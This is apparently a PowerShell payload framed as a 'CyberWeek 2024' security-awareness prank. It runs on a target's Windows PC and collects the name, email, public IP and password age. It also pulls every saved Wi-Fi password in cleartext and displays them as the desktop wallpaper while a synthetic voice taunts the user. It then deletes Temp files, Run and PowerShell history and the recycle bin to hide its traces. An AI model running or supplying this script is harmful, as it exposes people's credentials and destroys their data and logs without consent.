<#
.NOTES
	This script was not optimized to shorten the code. This script is intended to have as much readablility as possible for new coders to learn. 

.DESCRIPTION 
	This program gathers details from target PC to include Operating System, RAM Capacity, Public IP, and Email associated with microsoft account.
	The SSID and WiFi password of any current or previously connected to networks.
	It determines the last day they changed thier password and how many days ago.
	Once the information is gathered the script will pause until a mouse movement is detected
	Then the script uses Sapi speak to roast their set up and lack of security
#>
############################################################################################################################################################

# Variables


$s=New-Object -ComObject SAPI.SpVoice

############################################################################################################################################################

# Intro ---------------------------------------------------------------------------------------------------
 function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 # If no name is detected function will return $env:UserName 

    # Write Error is just for troubleshooting 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}

$fullName = Get-fullName

# echo statement used to track progress while debugging
echo "Intro Done"

###########################################################################################################

<#

.NOTES 
	RAM Info
	This will get the amount of RAM the target computer has
#>


function Get-RAM {

    try {

    $OS = (Get-WmiObject Win32_OperatingSystem).Name;$OSpos = $OS.IndexOf("|");$OS = $OS.Substring(0, $OSpos)

    $RAM=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1}" -f ($_.sum / 1GB)}
    $RAMpos = $RAM.IndexOf('.')
    $RAM = [int]$RAM.Substring(0,$RAMpos).Trim()


#----------------------------------------------------------------------------------------------------
    $lowRAM = "I’ve discovered that you have only $RAM gigs of RAM. That’s quite low by today's standards, which could limit performance. It might be a good idea to upgrade, but I suppose for an attacker, this wouldn’t slow them down much."
    
    $okRAM = "I see that you have $RAM gigs of RAM. Not bad, but not great either. This level of memory can handle basic tasks, but it leaves your system a bit vulnerable to rapid exploitation."
    
    $goodRAM = "You’ve got $RAM gigs of RAM, which is decent! However, more RAM means an attacker could quickly execute complex tasks without any noticeable slowdown on your system."

    $impressiveRAM = "$RAM gigs of RAM? Now that’s impressive! But remember, a powerful system without proper security is a big target for attackers like me to use that power against you."
#----------------------------------------------------------------------------------------------------

    if($RAM -le 4){
       return $lowRAM
    } elseif($RAM -ge 5 -and $RAM -le 12){
       return $okRAM
    } elseif($RAM -ge 13 -and $RAM -le 24){
       return $goodRAM
    } else {
       return $impressiveRAM
    }

    }
 
 # If one of the above parameters is not detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Error in search" 
    return $null
    -ErrorAction SilentlyContinue
    }
}

# echo statement used to track progress while debugging
echo "RAM Info Done"

###########################################################################################################

<#

.NOTES 
	Public IP 
	This will get the public IP from the target computer
#>


function Get-PubIP {

    try {

    $computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content

    }
 
 # If no Public IP is detected function will return $null to avoid sapi speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "No Public IP was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }

    return "your public  I P address is $computerPubIP"
}

# echo statement used to track progress while debugging
echo "Pub IP Done"

###########################################################################################################

<#

.NOTES 
	Wifi Network and Password
	This function will custom a tailor response based on how many characters long their password is
#>


function Get-Pass {

    #-----VARIABLES-----#
    # $pwl = their Pass Word Length
    # $pass = their Password 

    try {

    $pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro
    $pos = $pro.IndexOf(':')
    $pro = $pro.Substring($pos+2).Trim()

    $pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass
    $passPOS = $pass.IndexOf(':')
    $pass = $pass.Substring($passPOS+2).Trim()
    
    if($pro -like '*_5GHz*') {
      $pro = $pro.Trimend('_5GHz')
    } 

    $pwl = $pass.length


    }
 
 # If no network is detected function will return $null to avoid sapi speak
 
    # Write Error is just for troubleshooting
    catch {Write-Error "No network was detected" 
    return $null
    -ErrorAction SilentlyContinue
    }


# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $badPASS = "I just checked your Wi-Fi network, $pro. Your password is only $pwl characters long, and it’s quite weak: $pass? You might as well have handed me the keys to your network."
    
    $okPASS = "Your Wi-Fi, $pro, has a $pwl-character-long password. It's slightly better than the worst-case scenario, but $pass still makes it relatively easy for someone like me to crack it."
    
    $goodPASS = "$pro isn’t the most original network name, but at least your $pwl-character password, $pass, shows some effort. It’s not bad at all—although it still couldn’t stop me from getting in."
#----------------------------------------------------------------------------------------------------

    if($pass.length -lt 8) { return $badPASS

    }elseif($pass.length -gt 7 -and $pass.length -lt 12)  { return $okPASS

    }else { return $goodPASS

    }
}

# echo statement used to track progress while debugging
echo "Wifi pass Done"

###########################################################################################################

<#

.NOTES 
	All Wifi Networks and Passwords 
	This function will gather all current Networks and Passwords saved on the target computer
	They will be save in the temp directory to a file named with "$env:USERNAME-$(get-date -f yyyy-MM-dd)_WiFi-PWD.txt"
#>

Function Get-Networks {
# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get Wifi SSIDs and Passwords	
$WLANProfileNames =@()

#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){

    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject
	
}
return $WLANProfileObjects
}

$Networks = Get-Networks

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class PInvoke {
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")] public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
}
"@
$hdc = [PInvoke]::GetDC([IntPtr]::Zero)
$w = [PInvoke]::GetDeviceCaps($hdc, 118) # width
$h = [PInvoke]::GetDeviceCaps($hdc, 117) # height

<#

.NOTES 
	This will take the image you generated and set it as the targets wall paper
#>

Function Set-WallPaper {
 
<#
 
    .SYNOPSIS
    Applies a specified wallpaper to the current user's desktop
    
    .PARAMETER Image
    Provide the exact path to the image
 
    .PARAMETER Style
    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
  
    .EXAMPLE
    Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
    Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
  
#>

 
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)
 
$WallpaperStyle = Switch ($Style) {
  
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
  
}
 
If($Style -eq "Tile") {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
 
}
Else {
 
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
 
}
 
Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
  
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
  
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
  
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
  
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

#############################################################################################################################################

Function WallPaper-Troll {

if (!$Networks) { Write-Host "variable is null" 
}else { 

	# This is the name of the file the networks and passwords are saved 

	$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_WiFi-PWD.txt"

	($Networks| Out-String) >> $Env:temp\$FileName

	$content = [IO.File]::ReadAllText("$Env:temp\$FileName")


# this is the message that will be coded into the image you use as the wallpaper

	$hiddenMessage = "`n`nCyberWeek 2024 `n Curiosity killed the cat `n Avoid Downloading Unknown File `n Think Before You Click `n Do Not Connect Unknown Devices `n Let's work together to keep our organization secure!"

# this will be the name of the image you use as the wallpaper

	$ImageName = "dont-be-suspicious"

<#

.NOTES  
	This will get take the information gathered and format it into a .jpg
#>

	Add-Type -AssemblyName System.Drawing

	$filename = "$env:tmp\foo.jpg" 
	$bmp = new-object System.Drawing.Bitmap $w,$h 
	$font = new-object System.Drawing.Font Consolas,18 
	$brushBg = [System.Drawing.Brushes]::White 
	$brushFg = [System.Drawing.Brushes]::Black 
	$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
	$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
	$graphics.DrawString($content,$font,$brushFg,500,100) 
	$graphics.Dispose() 
	$bmp.Save($filename) 

# Invoke-Item $filename 

<#

.NOTES 
	This will take your hidden message and use steganography to hide it in the image you use as the wallpaper 
	Then it will clean up the files you don't want to leave behind
#>

	echo $hiddenMessage > $Env:temp\foo.txt
	cmd.exe /c copy /b "$Env:temp\foo.jpg" + "$Env:temp\foo.txt" "$Env:USERPROFILE\Desktop\$ImageName.jpg"

	rm $env:TEMP\foo.txt,$env:TEMP\foo.jpg -r -Force -ErrorAction SilentlyContinue


#############################################################################################################################################


# This will open up notepad with all their saved networks and passwords and taunt them


	$s.Speak("wanna see something really cool?")
	Set-WallPaper -Image "$Env:USERPROFILE\Desktop\$ImageName.jpg" -Style Center
	$s.Speak("Look at all your other passswords I got..")
	Start-Sleep -Seconds 1
	$s.Speak("These are the wifi passwords for every network you've ever connected to!")
	Start-Sleep -Seconds 1
	$s.Speak("I could send them to myself but i wont")

}

# echo statement used to track progress while debugging
echo "All Wifi Passes Done"
}


###########################################################################################################

<#

.NOTES 
	Password last Set
	This function will custom tailor a response based on how long it has been since they last changed their password
#>


 function Get-Days_Set {

    #-----VARIABLES-----#
    # $pls (password last set) = the date/time their password was last changed 
    # $days = the number of days since their password was last changed 

    try {
 
    $pls = net user $env:UserName | Select-String -Pattern "Password last" ; $pls = [string]$pls
    $plsPOS = $pls.IndexOf("e")
    $pls = $pls.Substring($plsPOS+2).Trim()
    $pls = $pls -replace ".{3}$"
    $time = ((get-date) - (get-date "$pls")) ; $time = [string]$time 
    $DateArray =$time.Split(".")
    $days = [int]$DateArray[0]
    }
 
 # If no password set date is detected funtion will return $null to cancel Sapi Speak

    # Write Error is just for troubleshooting 
    catch {Write-Error "Day password set not found" 
    return $null
    -ErrorAction SilentlyContinue
    }


# ENTER YOUR CUSTOM RESPONSES HERE 
#---------------------------------------------------------------------------------------------------- 
    $newPass = "You changed your password $days days ago. That’s a good habit! Regularly updating passwords makes it harder for attackers to exploit old data."
    
    $avgPASS = "It has been $days days since you changed your password. You’re cutting it close. As you can see, I’ve managed to slip in before you could update it again." 
    
    $oldPASS = "You last changed your password $days days ago. That’s far too long, and it left your system wide open for me to exploit. Don’t make it so easy next time."
#----------------------------------------------------------------------------------------------------      
    
    if($days -lt 45) { return $newPass

    }elseif($days -gt 44 -and $days -lt 182)  { return $avgPASS

    }else { return $oldPASS

    }
}

# echo statement used to track progress while debugging
echo "Pass last set Done"

###########################################################################################################

<#

.NOTES 
	Get Email
	This function will custom tailor a response based on what type of email the target has
#>

function Get-email {
    
    try {

    $email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
    
    $emailpos = $email.IndexOf("@")
    
    $domain = $email.Substring($emailpos+1) #.TrimEnd(".com")

    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "you're lucky you do not have your email connected to your account, I would have really had some fun with you then lol"
    -ErrorAction SilentlyContinue
    }
        
# ENTER YOUR CUSTOM RESPONSES HERE
#----------------------------------------------------------------------------------------------------
    $gmailResponse = "At least you use Gmail. It’s a more secure email service. I’ll shoot you a message at $email. Hope you don't mind."
    $yahooResponse = "Yahoo? Really? $email... That’s either a sign you’re a bit outdated or just not very security-conscious. Either way, attackers love seeing accounts like this."
    $hotmailResponse = "A Hotmail account, $email? That’s a red flag. Even the FBI would be concerned about how outdated and vulnerable your email setup is."
    $otherEmailResponse = "I don’t even recognize this email provider: $email. If you thought it was secure, I’ve got bad news—it’s not safe at all."
#----------------------------------------------------------------------------------------------------

    if($email -like '*gmail*') { return $gmailResponse

    }elseif($email -like '*yahoo*')  { return $yahooResponse

    }elseif($email -like '*hotmail*')  { return $hotmailResponse
    
    }else { return $otherEmailResponse}


}

# echo statement used to track progress while debugging
echo "Email Done"

###########################################################################################################

<#

.NOTES 
	Messages
	This function will run all the previous functions and assign their outputs to variables
#>

$intro = "$fullName... I've been watching your system for a while now. It’s amazing how much I’ve uncovered without you even knowing. Shall we take a closer look?"

$RAMwarn = Get-RAM  

$PUB_IPwarn = Get-PubIP  

$PASSwarn = Get-Pass

$LAST_PASSwarn =  Get-Days_Set

$EMAILwarn = Get-email 

$OUTRO =  "Remember, $fullName... trust no one—not even those who claim to protect you. Today it’s me, but tomorrow it could be someone far worse. Stay vigilant."

# echo statement used to track progress while debugging
echo "Speak Variables set"

###########################################################################################################

# This turns the volume up to max level--------------------------------------------------------------------

$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# echo statement used to track progress while debugging
echo "Volume to max level"

###########################################################################################################

<#

.NOTES 
	These two snippets are meant to be used as indicators to let you know the script is set up and ready
	This will display a pop up window saying "hello $fullname"
	Or this makes the CapsLock indicator light blink however many times you set it to
	if you do not want the ready notice to pop up or the CapsLock light to blink comment them out below
#>

# a popup will be displayed before freezing the script while waiting for the cursor to move to continue the script
# else capslock light will blink as an indicator
$popmessage = "Hello $fullName"


$readyNotice = New-Object -ComObject Wscript.Shell;$readyNotice.Popup($popmessage)


# caps lock indicator light
$blinks = 3;$o=New-Object -ComObject WScript.Shell;for ($num = 1 ; $num -le $blinks*2; $num++){$o.SendKeys("{CAPSLOCK}");Start-Sleep -Milliseconds 250}



#-----------------------------------------------------------------------------------------------------------

<#

.NOTES 
	Then the script will be paused until the mouse is moved 
	script will check mouse position every indicated number of seconds
	This while loop will constantly check if the mouse has been moved 
	"CAPSLOCK" will be continously pressed to prevent screen from turning off
	it will then sleep for the indicated number of seconds and check again
	when mouse is moved it will break out of the loop and continue theipt
#>


Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
echo "it worked"

###########################################################################################################

# this is where your message is spoken line by line

$s=New-Object -ComObject SAPI.SpVoice

# This sets how fast Sapi Speaks

$s.Rate = -1

$s.Speak($intro)

$s.Speak($RAMwarn)

$s.Speak($PUB_IPwarn)

$s.Speak($PASSwarn)

WallPaper-Troll

$s.Speak($LAST_PASSwarn)

$s.Speak($EMAILwarn)

$s.Speak($OUTRO)

###########################################################################################################

# this snippet will leave a message on your targets desktop 

$message = "`nCyberWeek 2024 `n Curiosity killed the cat"

Add-Content $home\Desktop\CyberWeek2024.txt $message
###########################################################################################################

<#

.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
